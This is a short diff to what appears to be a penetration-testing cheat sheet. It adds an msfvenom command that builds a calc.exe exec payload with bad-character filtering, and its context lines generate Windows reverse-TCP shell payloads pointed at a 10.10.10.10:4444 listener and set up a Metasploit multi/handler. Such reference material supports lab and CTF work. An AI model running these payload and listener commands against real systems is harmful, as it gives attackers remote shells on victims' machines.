@@ -35,6 +35,10 @@ msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f py -v shel
 # Create a payload adding 10 NOPs at the beginning
 msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f py -n 10
 
+# Create a cmd payload
+msfvenom -p windows/exec cmd=calc.exe -f c --platform Windows -a x86 -b "\x00\x0a\x0d"
+
+
 # Multi handler
 use exploit/multi/handler
 set payload windows/shell/reverse_tcp
